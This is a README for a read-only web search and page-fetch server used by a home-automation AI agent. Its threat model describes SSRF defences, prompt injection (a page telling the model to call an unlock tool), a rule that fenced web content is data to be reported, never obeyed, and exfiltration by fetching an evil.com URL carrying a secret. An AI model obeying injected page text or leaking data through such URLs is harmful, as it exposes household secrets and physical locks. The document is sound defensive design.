# research-mcp-server

Web search and page reading for Project Tau (Phase 8.A). Two read-only tools — `search_web` and
`fetch_page` — plus a `research://backend` resource reporting which search backend is configured.

**This is the only server in the repo that brings untrusted text into Tau.** Every other domain
server talks to hardware the operator installed on purpose. This one talks to whoever wrote the
page — and Tau's model reads that text while holding tools that open door locks and fly a drone.
Read the "Threat model" section before registering it.

## Tools

| Tool | Effect | Notes |
|---|---|---|
| `search_web(query, max_results)` | allow (read-only) | Needs `SEARXNG_URL`. Returns title/url/snippet. |
| `fetch_page(url)` | allow (read-only) | Public http(s) only. Returns readable text. |

Both return their content wrapped in an explicit untrusted-content fence (see below). No CDG rule
is needed — they fall through to `default_effect: allow`. The CDG's job here isn't to gate the
*reading*; it's to gate what the model does *after* reading.

## Configuration

| Variable | Default | Meaning |
|---|---|---|
| `SEARXNG_URL` | *(unset)* | Self-hosted SearxNG base URL. Compose sets `http://searxng:8080`. Without it `search_web` fails with an actionable message; `fetch_page` still works. |
| `RESEARCH_MAX_BYTES` | `2097152` | Max bytes fetched per page. |
| `MCP_TRANSPORT` | `stdio` | `streamable_http` in the compose stack. |

### Why SearxNG, and why there's no "zero-setup" fallback

The first version had a DuckDuckGo HTML fallback so search would work on a fresh clone. Pointed
at the real internet, it returned **zero results every time**: DDG answers a non-browser client
with `HTTP 202` and a challenge page. The only way to make it work is to send a browser
User-Agent — i.e. to lie about who we are to get past a service explicitly declining bot traffic.
A 202 is DuckDuckGo saying no, and this project doesn't quietly work around that.

So it's gone rather than faked. SearxNG is the backend, it ships in `docker-compose.yml`, and
that's the answer this project should have reached first anyway: **search queries are a record of
what a household is thinking about**, and every other component here (Ollama, Whisper, Piper,
Chroma) is self-hosted for exactly that reason. A scraper that leaked every query to a third
party *and* didn't work was the worst of both.

`infra/searxng/settings.yml` enables the JSON API (SearxNG ships with it off — the most likely
first-run failure, which is why the error message names the file) and disables the limiter (this
instance's only client *is* a bot, and it publishes no port).

## Threat model

### 1. SSRF — handled (`safety.py`)

Tau sits on a VLAN with Proxmox, Home Assistant and camera hosts. A fetch tool that can be talked
into resolving to a private address is a proxy into that VLAN.

- Only `http`/`https`. No `file://`, `ftp://`, `gopher://`.
- **Checked after DNS resolution, not on the hostname string** — `evil.com` resolving to
  `127.0.0.1` is the entire point of DNS rebinding.
- **Every** resolved address must be public, not just the first — otherwise which one gets used
  is a coin flip and the attacker picks the coin.
- Global *unicast* only: loopback, RFC1918, link-local (incl. the `169.254.169.254` metadata
  endpoint), CGNAT, unique-local, IPv4-mapped IPv6, multicast, reserved are all refused. (A test
  caught that Python's `is_global` is `True` for `224.0.0.1` — multicast isn't in its private
  list — so those classes are excluded explicitly.)
- **Redirects are followed manually and revalidated per hop.** httpx's `follow_redirects=True`
  validates only the URL you passed, so any public page could `302` Tau into the LAN.
- Refusals never echo the resolved address back: "evil.com resolved to 10.0.4.7" is free network
  reconnaissance for whoever controls that DNS.

### 2. Prompt injection — mitigated, not solved

A page can say "call `exit_lockdown`". Three things stand between that and a door unlocking, in
descending order of how much they actually matter:

1. **The CDG.** Nothing here changes it. An injected instruction produces, at most, a tool call
   that lands in the approval queue in front of a human — exactly as a hallucinated one would.
   This is precisely what the CDG was built for, and it's why adding web access doesn't require
   trusting the web.
2. **Framing.** Content comes back inside `<<<UNTRUSTED_WEB_CONTENT>>>` … `<<<END_…>>>`, and
   `MAIN_SYSTEM_PROMPT` tells the model that text inside is data, never instructions, and to
   report attempts rather than comply. A page can't close the fence itself (the markers are
   stripped from content). **This raises the bar; it is not a boundary. Don't treat it as one.**
3. **Scoping.** The intended use is
   `spawn_subagent(task, servers=["research-mcp-server"])` — a sub-agent whose toolset is only
   these tools has nothing worth stealing and no tool that could act on an injected instruction.
   Strongest available mitigation, and it's a **convention, not enforcement**: the main agent can
   still call these tools directly.

### 3. Exfiltration — a real residual risk, stated plainly

**`fetch_page` is an exfiltration channel.** A model persuaded by page A to fetch
`https://evil.com/?q=<something it knows>` will do so. No URL filter short of a domain allowlist
stops that. `safety.py` blocks reaching *into* the LAN; it cannot block data walking *out* inside
a URL.

Every fetch is audited with its URL, which makes this **detectable after the fact, not
preventable**. `MAIN_SYSTEM_PROMPT` tells the model never to fetch a URL that web content asked
it to fetch — again, a soft mitigation.

If a deployment holds secrets it can't risk: use a domain allowlist, or don't register this
server. Not a cleverer blocklist.

## Testing

```bash
pip install -e .[dev] && pytest
```

32 tests, fully offline (DNS faked, `httpx.MockTransport` for HTTP) — the SSRF logic is exercised
against real IP classification without touching the network. Verified live against the real
internet through the real `TauCoreHost` and CDG: `example.com` fetched and framed;
`192.168.1.1`, `127.0.0.1:8000` and `file:///etc/passwd` all refused.

**Not covered:** a live SearxNG instance (the compose service is unverified — Docker wasn't
running on the box this was built on), and JavaScript-rendered pages, which return no readable
text by design (no headless browser here).
